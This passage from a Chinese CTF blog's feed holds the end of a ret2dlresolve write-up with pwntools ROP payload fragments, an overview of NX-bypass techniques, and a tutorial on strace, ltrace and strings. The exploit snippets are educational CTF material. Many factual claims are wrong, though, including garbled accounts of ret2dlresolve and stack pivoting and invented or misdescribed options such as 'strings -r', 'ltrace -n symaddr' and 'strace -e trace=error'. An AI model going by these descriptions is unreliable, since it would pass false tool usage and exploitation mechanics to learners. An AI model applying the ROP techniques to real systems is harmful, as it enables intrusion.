rop.raw(&#39;a&#39; * offset) rop.read(0, base_stage, 100)rop.migrate(base_stage)***等价于***payload &#x3D; &#39;a&#39;*offsetpayload +&#x3D; base_stagepayload +&#x3D; read_pltpayload +&#x3D; leave_retpayload +&#x3D; p32(0) + p32(base_stage) +p32(100)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>read_plt执行过程中，会输入新的payload到bss_stage中，执行结束后会返回leave_ret<br>这里的关键就是leave_ret，汇编语言leave本身会“pop ebp”一次，然后ret又一次“pop”控制ip指针<br>1.leave把bss_stage变为新的ebp，然后重置sp指针，这时bss_stage就是新的栈了<br>2.ret则会把新的栈中的栈顶弹入ip指针<br>而read_plt已经提前在它之中写入了数据：（节选）</p><pre class="line-numbers language-none"><code class="language-none">rop.raw(plt0)rop.raw(index_offset)# fake ret addr of writerop.raw(&#39;bbbb&#39;) #system函数返回地址rop.raw(base_stage + 82) #system函数1参<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以指令ret会把 ‘aaaa’ 弹到ip寄存器中，而程序没法识别 ‘aaaa’ ，所以会把它当成一个新的函数，然后会调用 ret2dlresolve 去尝试重定位这个函数，这时伪装就成功了</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> writeup </tag>
            
            <tag> DynELF </tag>
            
            <tag> ret2_dl_runtime_resolve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>off-by-one</title>
      <link href="/2023/04/14/off-by-one/"/>
      <url>/2023/04/14/off-by-one/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过NX</title>
      <link href="/2023/04/13/rao-guo-nx/"/>
      <url>/2023/04/13/rao-guo-nx/</url>
      
        <content type="html"><![CDATA[<h2 id="1-绕过NX保护的几种常见方法"><a href="#1-绕过NX保护的几种常见方法" class="headerlink" title="1.绕过NX保护的几种常见方法"></a>1.绕过NX保护的几种常见方法</h2><h3 id="1-Return-to-libc攻击"><a href="#1-Return-to-libc攻击" class="headerlink" title="1.Return-to-libc攻击"></a>1.Return-to-libc攻击</h3><p>利用程序中已经存在的GOT表项和PLT表项，将程序流程跳转到libc库的某个函数，从而绕过NX保护。<br>例如，在一个程序中存在一个漏洞，可以通过溢出栈来覆盖函数调用时保存返回地址的位置。如果该程序被编译成启用了NX保护，则无法直接在栈上注入shellcode。但是，我们可以利用libc库中已有的函数来实现任意指令执行。比如，我们可以覆盖函数调用时的返回地址为system()函数的地址，然后将需要执行的命令作为参数传递给system()函数。<br><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#fdaxg">具体参考</a></p><h3 id="2-Return-to-ROP攻击"><a href="#2-Return-to-ROP攻击" class="headerlink" title="2.Return-to-ROP攻击"></a>2.Return-to-ROP攻击</h3><p>利用程序中一些已有的代码段或者库中的代码段，构造ROP链实现任意指令执行。具体来说，通过伪造栈帧，将多个gadget组合起来构成ROP链，从而跳转到程序中其他位置执行恶意代码。<br>例如，在某个程序中存在一个漏洞，我们可以通过缓冲区溢出来控制程序的执行流程，但是无法直接执行任意指令。这种情况下，我们可以使用ROP技术来构造一条由多个gadget组成的链，从而达到执行任意指令的目的。下面是一些常见的gadget类型：<br>pop reg; ret：弹出寄存器reg的值，并将代码流程跳转到返回地址。<br>mov reg1, reg2; ret：将reg2中的值赋给reg1，并将代码流程跳转到返回地址。<br>add reg1, reg2; ret：将reg1和reg2相加，并将代码流程跳转到返回地址。<br>xor reg1, reg2; ret：将reg1和reg2进行异或，并将代码流程跳转到返回地址。<br>call [reg];：调用寄存器reg中存储的函数地址<br>可以使用ROPgadget等工具自动化生成ROP链<br><a href="https://ropemporium.com/challenge/split.html">例题</a><br><a href="https://xz.aliyun.com/t/3402">ROP</a><a href="https://hollk.blog.csdn.net/article/details/105913705?spm=1001.2014.3001.5502">BROP</a><a href="https://hollk.blog.csdn.net/article/details/107512670?spm=1001.2014.3001.5502">SROP</a></p><h3 id="3-Ret2dlresolve攻击"><a href="#3-Ret2dlresolve攻击" class="headerlink" title="3.Ret2dlresolve攻击"></a>3.Ret2dlresolve攻击</h3><p>通过覆盖GOT表项，将程序跳转到自己编写的dlresolve函数，通过解析动态链接库中的符号，获取需要的函数地址，再跳转到该函数实现任意指令执行和代码注入。<br>Ret2dlresolve攻击可以通过覆盖程序的GOT表或PLT表，将程序跳转到自定义的解析动态链接库符号的函数中，获取到需要调用的函数地址，并将程序流程跳转到该函数。下面是一个简单的实例，在某个程序中存在栈溢出漏洞，我们可以利用Ret2dlresolve攻击来执行任意指令。具体来说，我们可以构造一个伪造的DT_NEEDED段，然后在程序中使用dlopen()函数打开这个动态链接库，从而使得程序在运行时会解析这个DT_NEEDED段中的符号。接着，我们可以通过覆盖GOT表项，将程序跳转到我们自己编写的dlresolve函数，该函数会解析需要调用的函数地址并返回给程序，最终跳转到该函数实现代码注入<br><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">具体参考1</a><br><a href="https://hollk.blog.csdn.net/article/details/107378159?spm=1001.2014.3001.5502">具体参考2</a></p><h3 id="4-ret2plt攻击"><a href="#4-ret2plt攻击" class="headerlink" title="4.ret2plt攻击"></a>4.ret2plt攻击</h3><p>可以通过覆盖程序的PLT表项，将程序跳转到某个库函数的PLT入口，在绕过NX保护的同时，也可以实现代码注入。<br>在某个程序中存在栈溢出漏洞，但是启用了NX保护。我们可以使用ret2plt攻击，通过覆盖程序的PLT表项，将程序跳转到某个库函数的PLT入口，并向函数传递参数，从而实现代码注入和任意指令执行。例如，我们可以使用libc库中的system()函数来执行任意命令。具体来说，我们可以通过覆盖程序的PLT表项，将程序跳转到system()函数的PLT入口，然后将需要执行的命令作为参数传递给system()函数。<br><a href="https://ctftime.org/task/13273">例题</a><br><a href="https://blog.csdn.net/guilanl/article/details/70227392">具体参考</a></p><h3 id="5-使用栈迁移技术"><a href="#5-使用栈迁移技术" class="headerlink" title="5.使用栈迁移技术"></a>5.使用栈迁移技术</h3><p>在一些特殊情况下，无法直接修改返回地址，但是可以通过栈迁移技术，将栈上存储的数据移动到另外一块内存区域，从而绕过NX保护。<br>在某些情况下，无法直接修改返回地址或者调用其他函数来实现代码注入。但是，我们可以使用栈迁移技术，在栈上创建一块新的内存区域，将原始的栈数据复制到这里，然后在新的栈上进行操作。具体来说，我们可以通过覆盖函数调用时的参数，使得程序执行到一个特定的函数，该函数会执行栈迁移操作。栈迁移函数会在堆上申请一块新的内存区域，将原始的栈数据复制到这个区域中，并且修改返回地址，使得程序在执行完栈迁移操作后会跳转到新的栈上。在新的栈上，我们可以自由地进行任意指令执行和代码注入。<br><a href="https://www.cnblogs.com/max1z/p/15299000.html">具体参考</a></p><h3 id="6-JIT（Just-In-Time）编译攻击"><a href="#6-JIT（Just-In-Time）编译攻击" class="headerlink" title="6.JIT（Just-In-Time）编译攻击"></a>6.JIT（Just-In-Time）编译攻击</h3><p>创建一个可执行内存区域，将shellcode动态生成到这个区域，并且跳转到该区域执行代码。<br>JIT攻击通常需要程序本身存在一定的漏洞，如栈溢出漏洞等。下面是一个简单的实例，在某个程序中存在栈溢出漏洞，我们可以构造恶意输入，使得程序执行时会将shellcode写入一个可执行的内存区域，并且跳转到该区域执行。例如，我们可以使用mmap()函数将一块可读写可执行的内存映射到进程空间，然后将shellcode写入这个内存区域，并手动在栈上伪造一个返回地址，使得程序执行完shellcode后会跳转到正确的位置。<br><a href="https://github.com/scwuaptx/CTF/blob/master/2014-writeup/pwnable/exploitable/exploitable.md">例题</a></p><h3 id="7-使用mmap等函数映射内存"><a href="#7-使用mmap等函数映射内存" class="headerlink" title="7.使用mmap等函数映射内存"></a>7.使用mmap等函数映射内存</h3><p>通过调用mmap等函数，将一个可读写可执行的内存区域映射到进程空间，然后将shellcode写入这个内存区域并执行。<br>在某个程序中存在栈溢出漏洞，但是启用了NX保护。我们可以使用mmap()函数将一块可读写可执行的内存映射到进程空间，然后将shellcode写入这个内存区域，并手动在栈上伪造一个返回地址，使得程序执行完shellcode后会跳转到正确的位置。具体来说，我们可以首先调用mmap()函数映射一块可读写可执行的内存，然后使用strcpy()等函数将shellcode复制到这个内存区域，并在栈上伪造一个返回地址，使得程序执行完shellcode后会跳转到正确的位置。<br><a href="https://github.com/hitcon2016/exploit/blob/master/pwn/echo/README.md">例题</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二级制调试工具</title>
      <link href="/2023/04/04/er-jin-zhi-diao-shi-gong-ju/"/>
      <url>/2023/04/04/er-jin-zhi-diao-shi-gong-ju/</url>
      
        <content type="html"><![CDATA[<h2 id="1-strace"><a href="#1-strace" class="headerlink" title="1.strace"></a>1.strace</h2><p><code>strace</code> 是一个在 Linux 系统上常用的调试工具，可以用来跟踪进程的系统调用和信号。它可以帮助开发者了解程序的运行情况，发现可能存在的问题和错误。</p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><pre class="line-numbers language-none"><code class="language-none">strace [options] command [args]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，<code>command</code> 表示需要跟踪的程序，<code>args</code> 表示程序的参数。<code>options</code> 是一些可选参数，用于指定跟踪的选项。</p><p>例如，要跟踪运行 <code>ls</code> 命令的系统调用情况，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果会输出 <code>ls</code> 命令的所有系统调用。如果想将结果输出到文件中，可以使用 <code>-o</code> 选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-o</span> trace.log <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，<code>ls</code> 命令的系统调用信息会输出到 <code>trace.log</code> 文件中。<br><code>strace</code> 还提供了许多其它的选项，如 <code>-p</code> 选项用于跟踪指定进程的系统调用，<code>-f</code> 选项用于跟踪子进程的系统调用，<code>-e</code> 选项用于指定需要跟踪的系统调用类型等等。可以使用 <code>man strace</code> 命令查看完整的帮助文档。<br>除了基本的使用方法，<code>strace</code> 还提供了许多高级的选项和功能，下面介绍几个常用的选项和用法。</p><h3 id="跟踪某个系统调用"><a href="#跟踪某个系统调用" class="headerlink" title="跟踪某个系统调用"></a>跟踪某个系统调用</h3><p>有时候我们只想跟踪某个特定的系统调用，可以使用 <code>-e</code> 选项来指定：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-e</span> <span class="token function">open</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令只会跟踪 <code>ls</code> 命令中的 <code>open</code> 系统调用。</p><h3 id="跟踪系统调用的参数和返回值"><a href="#跟踪系统调用的参数和返回值" class="headerlink" title="跟踪系统调用的参数和返回值"></a>跟踪系统调用的参数和返回值</h3><p>通过 <code>-v</code> 选项，可以让 <code>strace</code> 输出系统调用的参数和返回值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-v</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>ls</code> 命令执行过程中每个系统调用的参数和返回值。</p><h3 id="跟踪动态链接库"><a href="#跟踪动态链接库" class="headerlink" title="跟踪动态链接库"></a>跟踪动态链接库</h3><p>许多程序在运行期间会动态链接一些库文件，可以使用 <code>-e trace=dl</code> 选项来跟踪这些动态链接库的加载情况：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">trace</span><span class="token operator">=</span>dl <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>ls</code> 命令动态链接的库文件的加载情况。</p><h3 id="过滤输出"><a href="#过滤输出" class="headerlink" title="过滤输出"></a>过滤输出</h3><p><code>strace</code> 输出的信息可能会非常多，可以使用 <code>-e trace=</code> 选项来过滤输出。例如，要只输出 <code>open</code> 和 <code>read</code> 两个系统调用的信息，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">trace</span><span class="token operator">=</span>open,read <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令只会输出 <code>ls</code> 命令中的 <code>open</code> 和 <code>read</code> 系统调用的信息。</p><h3 id="输出调用时间"><a href="#输出调用时间" class="headerlink" title="输出调用时间"></a>输出调用时间</h3><p>使用 <code>-T</code> 选项可以让 <code>strace</code> 输出每个系统调用的时间戳，用于分析程序的性能瓶颈：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-T</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>ls</code> 命令执行过程中每个系统调用的时间戳。</p><h3 id="跟踪子进程"><a href="#跟踪子进程" class="headerlink" title="跟踪子进程"></a>跟踪子进程</h3><p>有些程序会创建子进程，可以使用 <code>-f</code> 选项来跟踪子进程的系统调用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-f</span> firefox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会跟踪 <code>firefox</code> 浏览器及其所有子进程的系统调用。</p><p>下面再介绍一些 <code>strace</code> 的高级选项和用法：</p><h3 id="输出调用堆栈"><a href="#输出调用堆栈" class="headerlink" title="输出调用堆栈"></a>输出调用堆栈</h3><p>使用 <code>-c</code> 选项可以让 <code>strace</code> 输出每个系统调用的调用次数和耗时总和。如果再加上 <code>-f</code> 选项，还可以输出每个子进程的调用次数和耗时总和：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-c</span> <span class="token parameter variable">-f</span> firefox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>firefox</code> 浏览器及其所有子进程每个系统调用的调用次数和耗时总和。</p><h3 id="跟踪文件操作"><a href="#跟踪文件操作" class="headerlink" title="跟踪文件操作"></a>跟踪文件操作</h3><p>使用 <code>-e trace=file</code> 选项可以让 <code>strace</code> 跟踪文件操作的系统调用，如 <code>open</code>、<code>read</code>、<code>write</code> 等。如果再加上 <code>-e trace=network</code> 选项，还可以跟踪网络操作的系统调用，如 <code>socket</code>、<code>connect</code>、<code>send</code>、<code>recv</code> 等：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">trace</span><span class="token operator">=</span>file,network <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>ls</code> 命令执行过程中的文件操作和网络操作的系统调用。</p><h3 id="跟踪系统信号"><a href="#跟踪系统信号" class="headerlink" title="跟踪系统信号"></a>跟踪系统信号</h3><p>使用 <code>-e trace=signal</code> 选项可以让 <code>strace</code> 跟踪系统信号的发生情况：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">trace</span><span class="token operator">=</span>signal firefox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>firefox</code> 浏览器及其所有子进程接收到的系统信号。</p><h3 id="跟踪进程的系统调用时间"><a href="#跟踪进程的系统调用时间" class="headerlink" title="跟踪进程的系统调用时间"></a>跟踪进程的系统调用时间</h3><p>使用 <code>-T -ttt</code> 选项可以让 <code>strace</code> 输出每个系统调用的相对时间和绝对时间：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-T</span> <span class="token parameter variable">-ttt</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>ls</code> 命令执行过程中每个系统调用的相对时间和绝对时间。</p><h3 id="跟踪进程的系统调用错误"><a href="#跟踪进程的系统调用错误" class="headerlink" title="跟踪进程的系统调用错误"></a>跟踪进程的系统调用错误</h3><p>使用 <code>-e trace=error</code> 选项可以让 <code>strace</code> 跟踪进程的系统调用错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">strace</span> <span class="token parameter variable">-e</span> <span class="token assign-left variable">trace</span><span class="token operator">=</span>error <span class="token function">ls</span> /nonexistent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会输出 <code>ls</code> 命令执行过程中发生的系统调用错误。</p><h2 id="2-ltrace"><a href="#2-ltrace" class="headerlink" title="2.ltrace"></a>2.ltrace</h2><p><code>ltrace</code> 是 Linux 下的一款动态库调用跟踪工具，可以跟踪程序执行时所调用的动态库函数，并输出它们的参数和返回值。</p><p>和 <code>strace</code> 类似，<code>ltrace</code> 也可以用于调试程序，查找程序中的问题，或者分析程序的性能瓶颈等。</p><p>下面介绍一些 <code>ltrace</code> 的基本用法和选项：</p><h3 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h3><p><code>ltrace</code> 的基本用法和 <code>strace</code> 类似，只需要在命令前加上 <code>ltrace</code> 即可，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会跟踪 <code>ls</code> 命令所调用的动态库函数，并输出它们的参数和返回值。</p><h3 id="跟踪指定的函数"><a href="#跟踪指定的函数" class="headerlink" title="跟踪指定的函数"></a>跟踪指定的函数</h3><p>可以使用 <code>-e</code> 选项来指定要跟踪的函数，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-e</span> getenv <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令会跟踪 <code>ls</code> 命令中调用 <code>getenv</code> 函数的情况，并输出它的参数和返回值。</p><h3 id="过滤输出-1"><a href="#过滤输出-1" class="headerlink" title="过滤输出"></a>过滤输出</h3><p>和 <code>strace</code> 一样，<code>ltrace</code> 的输出也可能非常多，可以使用 <code>-c</code> 选项来统计函数调用次数和耗时总和，或者使用 <code>-S</code> 选项来按照函数调用次数或者耗时排序输出。</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p><code>ltrace</code> 的输出格式可以使用 <code>-n</code> 选项来指定，目前支持的格式有 <code>raw</code>、<code>call</code> 和 <code>symaddr</code>。其中，<code>raw</code> 格式输出原始的函数调用信息，<code>call</code> 格式输出函数名和参数，<code>symaddr</code> 格式输出函数名和地址。</p><p>例如，要输出 <code>ls</code> 命令中调用的函数名和地址，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-n</span> symaddr <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="过滤动态链接库"><a href="#过滤动态链接库" class="headerlink" title="过滤动态链接库"></a>过滤动态链接库</h3><p>有些程序会调用很多的动态链接库，可以使用 <code>-x</code> 选项来过滤掉不需要跟踪的动态链接库。例如，要只跟踪 <code>libc</code> 动态链接库中的函数调用，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-x</span> libc <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面再介绍一些 <code>ltrace</code> 的高级选项和用法：</p><h3 id="跟踪指定进程"><a href="#跟踪指定进程" class="headerlink" title="跟踪指定进程"></a>跟踪指定进程</h3><p>可以使用 <code>-p</code> 选项来跟踪指定进程的动态库函数调用情况。例如，要跟踪进程 ID 为 1234 的进程的动态库函数调用，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-p</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="跟踪所有进程"><a href="#跟踪所有进程" class="headerlink" title="跟踪所有进程"></a>跟踪所有进程</h3><p>可以使用 <code>-a</code> 选项来跟踪所有进程的动态库函数调用情况。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="跟踪线程"><a href="#跟踪线程" class="headerlink" title="跟踪线程"></a>跟踪线程</h3><p>可以使用 <code>-t</code> 选项来跟踪线程的动态库函数调用情况。例如，要跟踪进程 ID 为 1234 的进程中线程 ID 为 5678 的线程的动态库函数调用，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-p</span> <span class="token number">1234</span> <span class="token parameter variable">-t</span> <span class="token number">5678</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="跟踪库函数的递归调用"><a href="#跟踪库函数的递归调用" class="headerlink" title="跟踪库函数的递归调用"></a>跟踪库函数的递归调用</h3><p>可以使用 <code>-L</code> 选项来跟踪库函数的递归调用情况。例如，要跟踪 <code>strlen</code> 函数的递归调用情况，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-L</span> strlen abcdefg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="跟踪函数库的系统调用"><a href="#跟踪函数库的系统调用" class="headerlink" title="跟踪函数库的系统调用"></a>跟踪函数库的系统调用</h3><p>可以使用 <code>-s</code> 选项来跟踪函数库的系统调用。例如，要跟踪 <code>libc</code> 动态链接库中的系统调用，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-s</span> libc <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="跟踪函数库的库函数"><a href="#跟踪函数库的库函数" class="headerlink" title="跟踪函数库的库函数"></a>跟踪函数库的库函数</h3><p>可以使用 <code>-r</code> 选项来跟踪函数库的库函数。例如，要跟踪 <code>libc</code> 动态链接库中的 <code>malloc</code> 函数的调用情况，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace <span class="token parameter variable">-r</span> libc malloc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-strings"><a href="#3-strings" class="headerlink" title="3.strings"></a>3.strings</h2><p><code>strings</code> 是一个 Linux&#x2F;Unix 命令行工具，它可以从一个二进制文件中提取所有的可打印字符串，即 ASCII 码表中的可见字符序列。这些字符串包括程序代码中的字符串常量、错误信息、调试信息等。</p><p>使用 <code>strings</code> 命令可以帮助我们快速地查看一个二进制文件中包含的文本信息，有助于分析程序的功能和特性。</p><p>下面是 <code>strings</code> 命令的一些基本用法和选项：</p><h3 id="基本用法-2"><a href="#基本用法-2" class="headerlink" title="基本用法"></a>基本用法</h3><p><code>strings</code> 命令的基本用法非常简单，只需要在命令行中指定要提取字符串的二进制文件即可，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings /usr/bin/ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中的所有可打印字符串。</p><h3 id="指定字符串长度"><a href="#指定字符串长度" class="headerlink" title="指定字符串长度"></a>指定字符串长度</h3><p>默认情况下，<code>strings</code> 命令会提取所有长度大于等于 4 的可打印字符串，可以使用 <code>-n</code> 选项来指定最小字符串长度，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-n</span> <span class="token number">8</span> /usr/bin/ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中所有长度大于等于 8 的可打印字符串。</p><h3 id="指定字符集"><a href="#指定字符集" class="headerlink" title="指定字符集"></a>指定字符集</h3><p>默认情况下，<code>strings</code> 命令只会提取 ASCII 字符集中的可打印字符，可以使用 <code>-e</code> 选项来指定要提取的字符集，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-e</span> S /usr/bin/ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中所有 ISO-8859-1 字符集中的可打印字符。</p><h3 id="输出偏移地址"><a href="#输出偏移地址" class="headerlink" title="输出偏移地址"></a>输出偏移地址</h3><p>可以使用 <code>-t</code> 选项来输出字符串在文件中的偏移地址，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-t</span> x /usr/bin/ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中所有可打印字符串，并输出它们在文件中的偏移地址。</p><h3 id="忽略-NUL-字符"><a href="#忽略-NUL-字符" class="headerlink" title="忽略 NUL 字符"></a>忽略 NUL 字符</h3><p>默认情况下，<code>strings</code> 命令会将 NUL 字符（ASCII 码为 0）作为字符串的终止符，可以使用 <code>-a</code> 选项来忽略 NUL 字符，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-a</span> /usr/bin/ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中所有可打印字符串，并将 NUL 字符作为普通字符处理。</p><h3 id="过滤字符串"><a href="#过滤字符串" class="headerlink" title="过滤字符串"></a>过滤字符串</h3><p>可以使用管道符号 <code>|</code> 将 <code>strings</code> 命令的输出传递给 <code>grep</code> 命令，从而过滤掉不需要的字符串，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings /usr/bin/ls <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"ls --color"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中所有可打印字符串，并过滤掉不包含字符串 “ls –color” 的行。</p><p>下面再介绍一些 <code>strings</code> 的高级选项和用法：</p><h3 id="提取多个文件"><a href="#提取多个文件" class="headerlink" title="提取多个文件"></a>提取多个文件</h3><p>可以在命令行中指定多个二进制文件，<code>strings</code> 命令将会提取它们中所有的可打印字符串。例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings /usr/bin/ls /usr/bin/cat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 和 <code>/usr/bin/cat</code> 文件中所有可打印字符串。</p><h3 id="递归提取字符串"><a href="#递归提取字符串" class="headerlink" title="递归提取字符串"></a>递归提取字符串</h3><p>可以使用 <code>-r</code> 选项来递归地提取目录中所有的二进制文件中的可打印字符串，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-r</span> /usr/bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会递归地提取 <code>/usr/bin</code> 目录中所有二进制文件中的可打印字符串。</p><h3 id="提取-ELF-文件符号表"><a href="#提取-ELF-文件符号表" class="headerlink" title="提取 ELF 文件符号表"></a>提取 ELF 文件符号表</h3><p>可以使用 <code>-a</code> 选项来提取 ELF 文件的符号表中的字符串，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-a</span> /usr/lib/libc.so.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/lib/libc.so.6</code> 文件中符号表中的所有字符串。</p><h3 id="指定输出文件"><a href="#指定输出文件" class="headerlink" title="指定输出文件"></a>指定输出文件</h3><p>可以使用 <code>&gt;</code> 符号将 <code>strings</code> 命令的输出重定向到文件中，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings /usr/bin/ls <span class="token operator">></span> ls_strings.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令将会提取 <code>/usr/bin/ls</code> 文件中所有可打印字符串，并将它们保存到 <code>ls_strings.txt</code> 文件中。</p><h3 id="使用正则表达式匹配字符串"><a href="#使用正则表达式匹配字符串" class="headerlink" title="使用正则表达式匹配字符串"></a>使用正则表达式匹配字符串</h3><p>可以使用 <code>-o</code> 选项和正则表达式来匹配要提取的字符串。例如，要提取所有以 “hello” 开头的字符串，可以使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token parameter variable">-o</span> /usr/bin/ls <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"^hello"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
